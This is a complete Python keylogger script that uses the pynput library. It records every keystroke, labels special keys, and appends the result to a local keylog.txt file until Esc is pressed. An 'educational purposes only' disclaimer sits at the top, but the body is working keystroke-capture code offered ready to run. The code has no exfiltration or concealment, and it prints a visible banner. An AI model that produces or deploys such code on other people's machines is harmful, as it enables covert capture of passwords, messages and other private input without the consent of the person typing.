"""
DISCLAIMER: This script is for educational purposes only. 
The creator is not responsible for any misuse of this tool. 
Always obtain explicit permission before monitoring any system.
"""

from pynput.keyboard import Key, Listener
import os

# Define the path for the log file in the same directory as the script
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    Captures the key and writes it to a local file.
    """
    try:
        # Convert key to string and strip single quotes for alphanumeric keys
        key_str = str(key).replace("'", "")
        
        # Handle special keys to make the log file more readable
        if key_str == 'Key.space':
            log_entry = " "
        elif key_str == 'Key.enter':
            log_entry = "\n"
        elif key_str == 'Key.tab':
            log_entry = " [TAB] "
        elif key_str == 'Key.backspace':
            log_entry = " [BACKSPACE] "
        elif "Key" in key_str:
            # Special keys like Shift, Ctrl, Alt, etc.
            key_name = key_str.split('.')[1].upper()
            log_entry = f" [{key_name}] "
        else:
            # Normal alphanumeric keys
            log_entry = key_str

        # Append the key to the log file
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
            
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """
    Callback function triggered when a key is released.
    Stops the listener when 'Esc' is pressed.
    """
    if key == Key.esc:
        print("\n[!] Stopping keylogger... Finalizing logs.")
        return False

def main():
    """
    Initializes and starts the keyboard listener.
    """
    print("========================================")
    print("       Python Keylogger (Educational)   ")
    print("========================================")
    print(f"[*] Logging keystrokes to: {LOG_FILE}")
    print("[*] Status: Running in background listener mode...")
    print("[*] Press 'Esc' to stop and exit.")
    print("----------------------------------------")

    # Start the listener to monitor keyboard events
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[!] Keylogger stopped by user (Ctrl+C).")

if __name__ == "__main__":
    main()
